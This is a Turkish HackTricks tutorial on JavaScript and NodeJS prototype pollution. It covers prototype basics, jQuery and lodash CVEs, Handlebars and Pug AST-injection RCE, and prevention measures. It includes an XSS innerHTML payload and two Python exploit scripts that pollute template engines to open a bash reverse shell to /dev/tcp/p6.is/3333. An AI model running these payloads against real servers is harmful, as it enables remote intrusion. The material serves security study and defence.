# NodeJS - \_\_proto\_\_ & prototype Pollution

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## JavaScript'te Nesneler <a href="#id-053a" id="id-053a"></a>

JavaScript'te nesneler temelde özellikler olarak bilinen anahtar-değer çiftlerinin koleksiyonlarıdır. Bir nesne, miras alınmış özelliklere sahip olmayan boş bir nesne oluşturmak için `Object.create` kullanılarak `null` argümanı ile oluşturulabilir. Bu yöntem, miras alınmış özelliklere sahip olmayan bir nesnenin oluşturulmasına izin verir.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Bir boş nesne, `{}` şeklinde temsil edilen boş bir sözlüğe benzer.

### JavaScript'te Fonksiyonlar ve Sınıflar

JavaScript'te sınıflar ve fonksiyonlar sıkı bir şekilde bağlantılıdır, fonksiyonlar genellikle sınıflar için yapılandırıcılar olarak hizmet eder. JavaScript'in yerel sınıf desteğinin olmamasına rağmen, yapılandırıcılar sınıf davranışını taklit edebilir.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototipler JavaScript'te

JavaScript, prototip özelliklerinin çalışma zamanında değiştirilmesine, eklenmesine veya silinmesine izin verir. Bu esneklik, sınıf işlevlerinin dinamik olarak genişletilmesini sağlar.

`toString` ve `valueOf` gibi işlevlerin davranışlarını değiştirmek için değiştirilebilir, bu da JavaScript'in prototip sisteminin uyarlanabilir doğasını gösterir.

## Kalıtım

Prototip tabanlı programlamada, özellikler/metodlar sınıflardan nesnelere miras alınır. Bu sınıflar, özellikler/metodlar ekleyerek ya başka bir sınıfın bir örneğine ya da boş bir nesneye oluşturulur.

Bir nesne için prototip olarak hizmet eden bir nesneye (örneğin `myPersonObj`) bir özellik eklenirse, miras alan nesneler bu yeni özelliğe erişir. Ancak bu özellik, açıkça çağrılmadıkça otomatik olarak görüntülenmez.

## \_\_proto\_\_ kirliliği <a href="#id-0d0a" id="id-0d0a"></a>

## JavaScript'te Prototip Kirliliğini Keşfetme

JavaScript nesneleri anahtar-değer çiftleri tarafından tanımlanır ve JavaScript Nesne prototipinden miras alırlar. Bu, Nesne prototipinin değiştirilmesinin tüm ortamdaki tüm nesneleri etkileyebileceği anlamına gelir.

Bunu açıklamak için farklı bir örnek kullanalım:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Erişim, Object prototipi üzerinden mümkündür:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Object prototipine özellikler ekleyerek, her JavaScript nesnesi bu yeni özellikleri miras alacaktır:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototype pollution

`__proto__` kullanımının kısıtlandığı bir senaryo için, bir fonksiyonun prototype'ini değiştirmek alternatif bir yöntemdir:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Bu yalnızca `Vehicle` yapıcısından oluşturulan nesneleri etkiler, onlara `beep`, `hasWheels`, `honk` ve `isElectric` özelliklerini verir.

JavaScript nesnelerini genel olarak etkilemek için iki yöntem şunlardır:

1. `Object.prototype`'yi doğrudan kirletme:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Sıkça kullanılan bir yapının prototipini kirletme:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
## Diğer nesneleri kirletme

### Bir sınıftan Object.prototype'a

Belirli bir nesneyi kirletebileceğiniz ve `Object.prototype`'e ulaşmanız gereken bir senaryoda, aşağıdaki gibi bir kod parçasıyla onu arayabilirsiniz:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Dizi elemanları kirliliği

JS'de nesnelerin özelliklerini kirlettiğiniz gibi, bir diziyi kirletme erişiminiz varsa, dizinin değerlerini de **dizi indeksleriyle** erişilebilir şekilde **kirletebilirsiniz** (değerleri üzerine yazamazsınız, bu yüzden kullanılan ancak yazılmayan indeksleri kirletmeniz gerekir).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html elemanları kirliliği

JS aracılığıyla bir HTML elemanı oluşturulurken, **`innerHTML`** özniteliğini **üzerine yazmak** ve **keyfi HTML kodu yazdırmak** mümkündür. [Fikir ve örnek bu yazıdan alınmıştır](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Örnekler

### Temel Örnek

Prototip kirliliği, uygulamadaki bir hatadan kaynaklanır ve `Object.prototype` üzerindeki özelliklerin üzerine yazılmasına izin verir. Bu, çoğu nesnenin özelliklerini `Object.prototype`'den türettiği anlamına gelir.

En basit örnek, kontrol edilecek bir nesnenin **tanımsız bir özelliğine** bir değer eklemektir, örneğin:
```javascript
if (user.admin) {
```
Eğer **`admin` özelliği tanımsızsa**, bir PP'yi istismar etmek ve şuna benzer bir şeyle True olarak ayarlamak mümkündür:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Bu mekanizmanın arkasındaki şey, saldırganın belirli girdiler üzerinde kontrol sahibi olduğunda, uygulamadaki tüm nesnelerin prototipini değiştirebileceği özellikleri manipüle etmektir. Bu manipülasyon genellikle, JavaScript'te bir nesnenin prototipini doğrudan değiştirmekle eş anlamlı olan `__proto__` özelliğinin ayarlanmasını içerir.

Bu saldırının başarılı bir şekilde gerçekleştirilebileceği koşullar, belirli bir [çalışmada](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) belirtildiği gibi şunları içerir:

* Yinelemeli bir birleştirme gerçekleştirme.
* Bir yol üzerine tanımlanan özelliklerin belirlenmesi.
* Nesnelerin klonlanması.

### Fonksiyonu geçersiz kılma
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Kirliliği ile Uzaktan Kod Çalıştırma

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## İstemci tarafı proto kirliliği ile XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: jQuery $ .extend ile Proto Kirliliği Saldırısı

[Daha fazla detay için bu makaleye bakın](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) jQuery'de, `$ .extend` fonksiyonu derin kopya özelliği yanlış kullanıldığında proto kirliliğine neden olabilir. Bu fonksiyon genellikle nesneleri klonlamak veya varsayılan bir nesneden özellikleri birleştirmek için kullanılır. Ancak yanlış yapılandırıldığında, yeni bir nesne için amaçlanan özellikler prototipe atanabilir. Örneğin:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Bu zafiyet, CVE-2019–11358 olarak tanımlanmış olup, derin kopyalamanın yanlışlıkla prototipi değiştirebileceğini ve `isAdmin` gibi özelliklerin uygun varlık doğrulaması olmadan kontrol edilmesi durumunda yetkisiz yönetici erişimi gibi potansiyel güvenlik risklerine yol açabileceğini göstermektedir.

### CVE-2018–3721, CVE-2019–10744: lodash üzerinden prototip kirliliği saldırısı

[Daha fazla detay için bu makaleye bakın](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) benzer prototip kirliliği zafiyetleri (CVE-2018–3721, CVE-2019–10744) ile karşılaştı. Bu sorunlar 4.17.11 sürümünde ele alındı.

### CVE'ler ile başka bir rehber

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Prototip Kirliliğini Algılamak İçin Araçlar

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner): Web uygulamalarındaki sunucu tarafı prototip kirliliği zafiyetlerini tespit etmek ve analiz etmek için tasarlanmış Burp Suite eklentisi. Bu araç, potansiyel prototip kirliliği sorunlarını belirlemek için tarama işlemini otomatikleştirir. Bilinen gadget'ları - zararlı eylemleri gerçekleştirmek için prototip kirliliğinden yararlanma yöntemlerini - özellikle Node.js kütüphanelerine odaklanarak kullanır.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution): Bu uzantı, sunucu tarafı prototip kirliliği zafiyetlerini tanımlar. [Sunucu tarafı prototip kirliliği](https://portswigger.net/research/server-side-prototype-pollution) açıklamalarında kullanılan teknikleri kullanır.

### NodeJS'de AST Prototip Kirliliği

NodeJS, şablon motorları ve TypeScript gibi işlevler için JavaScript'te Soyut Sözdizimi Ağaçları (AST) yoğun bir şekilde kullanır. Bu bölüm, şablon motorları, özellikle Handlebars ve Pug ile ilişkili prototip kirliliği ile ilgili zafiyetleri keşfeder.

#### Handlebars Zafiyet Analizi

Handlebars şablon motoru, prototip kirliliği saldırısına açıktır. Bu zafiyet, `javascript-compiler.js` dosyasındaki belirli fonksiyonlardan kaynaklanmaktadır. Örneğin, `appendContent` fonksiyonu, varsa `pendingContent`'i birleştirirken, `pushSource` fonksiyonu kaynağı ekledikten sonra `pendingContent`'i `undefined` olarak sıfırlar.

**Sömürü Süreci**

Sömürü, Handlebars tarafından üretilen AST (Soyut Sözdizimi Ağacı) kullanılarak şu adımları izler:

1. **Ayrıştırıcının Manipülasyonu**: Başlangıçta, ayrıştırıcı, `NumberLiteral` düğümü aracılığıyla değerlerin sayısal olmasını zorlar. Prototip kirliliği, sayısal olmayan dizelerin eklenmesine olanak tanıyarak bunu atlayabilir.
2. **Derleyici Tarafından İşlenme**: Derleyici, bir AST Objesini veya bir dize şablonunu işleyebilir. `input.type` `Program` eşit olduğunda, giriş önceden ayrıştırılmış olarak işlenir, bu da sömürülebilir.
3. **Kod Enjeksiyonu**: `Object.prototype`'nin manipülasyonu aracılığıyla, şablon fonksiyonuna keyfi kod enjekte edilebilir, bu da uzaktan kod yürütmesine yol açabilir.

Handlebars zafiyetinin sömürülmesini gösteren bir örnek:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Bu kod, bir saldırganın Handlebars şablonuna keyfi kod enjekte edebileceğini göstermektedir.

**Harici Referans**: Prototip kirliliği ile ilgili bir sorun, burada detayları verilen 'flat' kütüphanesinde bulundu: [GitHub'daki Sorun](https://github.com/hughsk/flat/issues/105).

**Harici Referans**: [flat kütüphanesindeki prototip kirliliği ile ilgili sorun](https://github.com/hughsk/flat/issues/105)

Python'da prototip kirliliği sömürüsü örneği:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Güvenlik Açığı

Pug, başka bir şablon motoru, prototip kirliliği riskiyle karşı karşıyadır. Ayrıntılı bilgi, [Pug'da AST Enjeksiyonu](https://blog.p6.is/AST-Injection/#Pug) başlıklı tartışmada bulunabilir.

Pug'da prototip kirliliği örneği:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Önleyici Önlemler

Prototip kirliliği riskini azaltmak için aşağıdaki stratejiler uygulanabilir:

1. **Nesne Değişmezliği**: `Object.prototype` `Object.freeze` uygulanarak değişmez hale getirilebilir.
2. **Giriş Doğrulaması**: JSON girişleri uygulamanın şemasına karşı sıkı bir şekilde doğrulanmalıdır.
3. **Güvenli Birleştirme Fonksiyonları**: Güvensiz rekürsif birleştirme fonksiyonlarının kullanımı kaçınılmalıdır.
4. **Prototipsiz Nesneler**: Prototip özellikleri olmayan nesneler `Object.create(null)` kullanılarak oluşturulabilir.
5. **Map Kullanımı**: `Object` yerine anahtar-değer çiftlerini depolamak için `Map` kullanılmalıdır.
6. **Kütüphane Güncellemeleri**: Güvenlik yamaları düzenli olarak güncellenen kütüphanelere entegre edilebilir.
7. **Linter ve Statik Analiz Araçları**: Prototype kirliliği zafiyetlerini tespit etmek ve önlemek için ESLint gibi uygun eklentilere sahip araçlar kullanılmalıdır.
8. **Kod İncelemeleri**: Prototype kirliliği ile ilgili potansiyel riskleri belirlemek ve gidermek için detaylı kod incelemeleri uygulanmalıdır.
9. **Güvenlik Eğitimi**: Geliştiricileri prototype kirliliği riskleri ve güvenli kod yazma en iyi uygulamaları konusunda eğitin.
10. **Dikkatle Kütüphane Kullanımı**: Üçüncü taraf kütüphaneleri kullanırken dikkatli olun. Güvenlik durumlarını değerlendirin ve özellikle nesneleri manipüle eden kütüphanelerin kodlarını gözden geçirin.
11. **Çalışma Zamanı Koruması**: Prototype kirliliği saldırılarını tespit edebilen ve önleyebilen güvenlik odaklı npm paketleri gibi çalışma zamanı koruma mekanizmaları kullanın.

## Referanslar

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>Sıfırdan ileri seviyeye AWS hackleme konusunda</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u takip edin.
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR gönderin.

</details>
